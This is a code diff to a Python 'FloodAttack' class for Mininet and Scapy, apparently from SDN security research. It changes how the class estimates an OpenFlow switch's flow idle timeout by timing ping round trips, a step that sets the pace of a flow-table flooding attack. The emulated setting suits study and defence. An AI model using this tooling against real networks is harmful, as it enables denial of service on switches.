@@ -1,5 +1,6 @@
 import random
 import time
+import re
 
 from typing import List
 from threading import Thread, Event
@@ -7,21 +8,23 @@ from threading import Thread, Event
 from mininet.node import OVSSwitch, Intf
 
 from scapy.all import (
-    Ether, IP, TCP, UDP, ICMP, Packet, sendp, srp,
+    Ether, IP, TCP, UDP, ICMP, Packet, sendp, srp1, getmacbyip,
     fuzz, RandIP, RandMAC, RandChoice, RandShort
 )
 
 class FloodAttack:
 
-    def __init__(self, switch: OVSSwitch, iface: Intf, npacket: int, added_new_packets: int):
+    def __init__(self, switch, iface, npacket, added_new_packets,
+                 net=None, probe_src='h7', probe_dst_ip='10.0.0.66'):
         self.switch = switch
         self.iface = iface
-        self.npacket = npacket #RPR
+        self.npacket = npacket
         self.added_new_packets = added_new_packets
-        self.attack_frequency = 0
         self.macs: List[str] = []
-        self._attack_thread: Thread = None
-        self.rtt_tolerance = 0.015
+        self.net = net
+        self.probe_src = probe_src
+        self.probe_dst_ip = probe_dst_ip
+        self.attack_frequency = 0
         self.max_iter = 1000
         self.max_interval = 100
         self._stop_event: Event = Event()
@@ -89,57 +92,51 @@ class FloodAttack:
         start = int(self.attack_frequency * 0.2)
         return random.randint(start, self.attack_frequency - 1)
 
-    def measure_rtt(self, src_mac, src_ip, dst_mac, dst_ip, timeout=10):
-        pkt = IP(src=src_ip, dst=dst_ip) / ICMP()
-        t_start = time.time()
-        reply = srp(pkt, timeout=timeout, verbose=0)
-        t_end = time.time()
-        if reply is None:
-            return None
-        print(f"{t_end}, {t_end - t_start}")
-        return t_end, t_end - t_start
+    def measure_rtt(self, src_host, dst_ip, timeout=10):
+        out = src_host.cmd(f'ping -c 1 -W {timeout} {dst_ip}')
+        t_now = time.time()
+        m = re.search(r'time=([\d.]+)\s*ms', out)
+        if not m:
+            return t_now, None
+        rtt = float(m.group(1)) / 1000.0
+        return t_now, rtt
 
-    def approximately_equal(self, a, b):
-        if a is None or b is None:
-            return False
-        if a == 0:
-            return b == 0
-        return abs(a - b) / a <= self.rtt_tolerance
-
-    def estimate_idle_timeout(self, src_mac, src_ip, dst_mac, dst_ip):
-        t0, rtt0 = self.measure_rtt(src_mac, src_ip, dst_mac, dst_ip)
-        t1, rtt1 = self.measure_rtt(src_mac, src_ip, dst_mac, dst_ip)
+    def estimate_idle_timeout(self, src_host, dst_ip):
+        t0, rtt0 = self.measure_rtt(src_host, dst_ip)
+        t1, rtt1 = self.measure_rtt(src_host, dst_ip)
 
         if rtt0 is None or rtt1 is None:
+            print("[!] Host irraggiungibile, impossibile stimare tidle")
             return None
 
-        if self.approximately_equal(rtt1, rtt0):
-            print("Error at estimate_idle_timeout")
-            return 10
+        if abs(rtt1 - rtt0) / rtt1 <= 0.1:
+            print("[!] Impossibile distinguere table-hit da table-miss")
+            return None
 
-        tidle = None
-        iteration = 0
+        threshold = (rtt0 + rtt1) / 2
+
         interval = 1
-
-        while iteration < self.max_iter:
+        for _ in range(self.max_iter):
             time.sleep(interval)
-            ti, rtti = self.measure_rtt(src_mac, src_ip, dst_mac, dst_ip)
-            if self.approximately_equal(rtti, rtt0):
-                tidle = ti - t0
-                break
+            ti, rtti = self.measure_rtt(src_host, dst_ip)
+
+            if rtti is None:
+                print("[!] Probe fallita durante la stima")
+                return None
+
+            if rtti >= threshold:
+                return interval
+
             interval += 1
             if interval > self.max_interval:
                 break
-            iteration += 1
-        return tidle
+
+        return None
 
     def stage_0(self) -> None:
-        src_mac = '77:77:77:77:77:77'
-        src_ip = '10.0.0.77'
-        dst_mac = '66:66:66:66:66:66'
-        dst_ip = '10.0.0.66'
+        src_host = self.net.get(self.probe_src)
         print("[*] Tidle...")
-        self.attack_frequency = self.estimate_idle_timeout(src_mac, src_ip, dst_mac, dst_ip)
+        self.attack_frequency = self.estimate_idle_timeout(src_host, self.probe_dst_ip)
         print(f"[*] Tidle={self.attack_frequency}")
 
     def stage_1(self) -> None:
